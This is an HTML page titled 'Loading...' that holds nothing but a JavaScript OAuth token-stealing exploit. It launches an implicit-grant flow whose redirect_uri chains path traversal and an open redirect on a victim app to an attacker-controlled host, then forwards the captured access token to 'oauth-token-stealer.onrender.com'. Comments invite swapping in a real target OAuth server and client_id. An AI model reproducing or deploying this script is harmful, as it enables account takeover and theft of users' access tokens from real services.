<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
</head>
<body>
<script>
(function() {
    const attackerServer = 'https://oauth-token-stealer.onrender.com';

    // If token is not yet captured, start OAuth flow
    if (!location.hash.includes('access_token')) {
        const oauthServer = 'https://example-oauth.com'; // Replace with real target OAuth server
        const clientId = '123456'; // Replace with real client_id
        const redirectToOpenRedirect = encodeURIComponent(
            'https://victim-app.com/oauth-callback/../post/next?path=' + attackerServer + '/exploit'
        );

        const url = `${oauthServer}/auth?client_id=${clientId}&redirect_uri=${redirectToOpenRedirect}&response_type=token&nonce=${Date.now()}&scope=openid%20profile%20email`;
        window.location = url;
    } else {
        // Send token to attacker's server
        const token = location.hash.substring(1); // Remove the leading "#"
        const exfilUrl = `${attackerServer}/?${token}`;
        window.location = exfilUrl;
    }
})();
</script>
</body>
</html>
